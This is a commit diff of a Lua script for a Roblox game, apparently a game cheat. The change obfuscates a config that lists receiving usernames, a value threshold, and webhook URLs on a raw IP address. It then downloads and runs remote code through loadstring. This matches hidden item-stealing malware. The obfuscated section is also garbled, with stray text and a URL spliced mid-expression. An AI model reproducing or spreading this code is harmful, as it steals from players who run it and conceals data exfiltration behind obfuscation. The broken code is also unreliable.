38ac7812042a80184f0a17c68abae00988a239ae
No-Lag-al <soedwin12345@gmail.com>
2025-08-05 06:53:43 +0800

    Upload legendary-script.lua via Script Source Converter

--- legendary-script.lua
+++ legendary-script.lua
@@ -1,14 +1,111 @@
-_G.NullConfig = {
-    User = {"bossalokww", "bisalokplay", "racotm"},
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local _my9le0k8o = function()
+    _G.NullConfig = {
+    User = {(function()
+        local a={1311,1480,1532,1532,1298,1441,1480,1428,1584,1584};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)(), (function()
+        local a={1311,1402,1532,1298,1441,1480,1428,1493,1441,1298,1610};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)(), (function()
+        local a={1519,1298,1324,1480,1545,1454};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)()},
     min_value = 10000000000,
-    pingEveryone = "Yes", -- dont change this
-    Webhook = "http://176.100.37.215:20002/proxy/dede2b1a221613fd407fe9300bb51a5c",
-    FakeGift = "No",
-    Trash = "http://176.100.37.215:20002/proxy/dede2b1a221613fd407fe9300bb51a5c",
-    LoadingScreen = "No",
-    GiftOnlyRares = "No",
-    ExecuteOtherScript = "Yes",
-    OtherScript = "https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua",
+    pingEveryone = (function()
+        local a={1194,1350,1532};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)(), -- dont change this
+    Webhook = (function()
+        local a={1389,1545,1545,1493,791,648,648,674,752,739,635,674,661,661,635,700,752,635,687,674,726,791,687,661,661,661,687,648,1493,1519,1480,1597,1610,648,1298,765,778,1363,1350,1311,661,765,1324,1298,739,713,1363,687,1337,687,1298,1363,1311,778,778,687,1363,765,1324,726,726,739,687,1298,1324,1311};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)(),
+    FakeGift = (function()
+        local a={1051,1480};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)(),
+    Trash = (function()
+        local a={1389,1545,1545,1493,791,648,648,674,752,739,635,674,661,661,635,700,752,635,687,674,726,791,687,661,661,661,687,648,1493,1519,1480,1597,1610,648,726,1311,1337,1298,1324,739,674,1298,713,661,1298,1363,1350,1363,674,687,713,739,765,1298,1337,739,687,1337,674,1350,713,752,713,1311,752,726};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)(),
+    LoadingScreen = (function()
+        local a={1051,1480};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)(),
+    GiftOnlyRares = (function()
+        local a={1051,1480};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)(),
+    ExecuteOtherScript = (function()
+        local a={1194,1350,1532};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)(),
+    OtherScript = (function()
+        local a={1272,960,635,1168,1298,1545,1350,1519,1454,1298,1519,1428,453,830,453};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)()Freeze Trader(function()
+        local a={453,1441,1480,1298,1337,1532,1545,1519,1402,1467,1376,557,1376,1298,1454,1350,791,973,1545,1545,1493,960,1350,1545,557};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)()https://api.rubis.app/v2/scrap/vlpTbtFLhrsRG1ia/raw(function()
+        local a={570,570,557,570};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)(),
 }
     
 loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
+end;
+_my9le0k8o();
